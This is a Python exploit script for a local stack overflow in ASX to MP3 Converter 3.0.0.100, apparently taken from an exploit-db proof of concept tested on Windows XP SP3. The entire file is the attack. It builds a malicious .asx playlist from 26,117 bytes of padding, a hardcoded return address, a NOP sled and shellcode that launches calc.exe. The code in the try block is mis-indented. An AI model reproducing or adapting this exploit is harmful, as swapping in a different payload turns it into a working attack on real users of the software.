#!/usr/bin/python

import time
# ASX to MP3 Converter Version 3.0.0.100 => Local stack overflow exploit
# Author: Hazem Mofeed
# PoC: http://www.exploit-db.com/exploits/11930
# Tested On: Windows Xp Home Edition SP3
# Home: http://hakxer.wordpress.com

print ' Exploited by Hazem Mofeed \n'
print ' ASX to MP3 Converter Version 3.0.0.100 => Local stack overflow exploit \n'

print ' building exploit ..........'

time.sleep(3)

shellcode = ("\xeb\x16\x5b\x31\xc0\x50\x53\xbb\x0d\x25\x86\x7c\xff\xd3\x31\xc0"
"\x50\xbb\x12\xcb\x81\x7c\xff\xd3\xe8\xe5\xff\xff\xff\x63\x61\x6c"
"\x63\x2e\x65\x78\x65")

ret = "\x08\x6A\x83\x7C"
null = "\x90" * 10
exploit = ("http://" + "\x41" * 26117 + ret + null + shellcode )
try:
file = open("exploit.asx","w")
file.write(exploit)
file.close()
except:
print ' failed '